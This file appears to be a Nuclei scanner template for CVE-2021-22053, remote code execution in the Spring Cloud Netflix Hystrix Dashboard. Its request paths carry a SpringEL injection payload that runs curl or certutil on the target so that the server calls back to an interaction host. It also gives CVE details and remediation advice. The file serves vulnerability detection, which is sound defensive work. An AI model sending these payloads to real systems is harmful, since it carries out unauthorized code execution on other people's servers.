http:
- matchers:
  - part: interactsh_protocol
    type: word
    words:
    - http
  - part: interactsh_request
    regex:
    - 'User-Agent: (curl|CertUtil)'
    type: regex
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/hystrix/;a=a/__${T (java.lang.Runtime).getRuntime().exec("curl http://{{interactsh-url}}")}__::.x/'
  - '{{BaseURL}}/hystrix/;a=a/__${T (java.lang.Runtime).getRuntime().exec("certutil
    -urlcache -split -f http://{{interactsh-url}}")}__::.x/'
id: CVE-2021-22053
info:
  author: forgedhallpass
  classification:
    cpe: cpe:2.3:a:vmware:spring_cloud_netflix:*:*:*:*:*:*:*:*
    cve-id: CVE-2021-22053
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 8.8
    cwe-id: CWE-94
    epss-percentile: 0.99336
    epss-score: 0.85682
  description: 'Spring Cloud Netflix Hystrix Dashboard prior to version 2.2.10 is
    susceptible to remote code execution. Applications using both `spring-cloud-netflix-hystrix-dashboard`
    and `spring-boot-starter-thymeleaf` expose a way to execute code submitted within
    the request URI path during the resolution of view templates.  When a request
    is made at `/hystrix/monitor;[user-provided data]`, the path elements following
    `hystrix/monitor` are being evaluated as SpringEL expressions, which can lead
    to code execution.

    '
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute arbitrary code on the target system.

    '
  metadata:
    max-request: 2
    product: spring_cloud_netflix
    vendor: vmware
  name: Spring Cloud Netflix Hystrix Dashboard <2.2.10 - Remote Code Execution
  reference:
  - https://github.com/SecCoder-Security-Lab/spring-cloud-netflix-hystrix-dashboard-cve-2021-22053
  - https://tanzu.vmware.com/security/cve-2021-22053
  - https://nvd.nist.gov/vuln/detail/CVE-2021-22053
  - https://github.com/trhacknon/Pocingit
  - https://github.com/ARPSyndicate/kenzer-templates
  remediation: 'Upgrade to Spring Cloud Netflix Hystrix Dashboard version 2.2.10 or
    later to mitigate this vulnerability.

    '
  severity: high
  tags: cve,cve2021,rce,spring,vmware,vkev,vuln
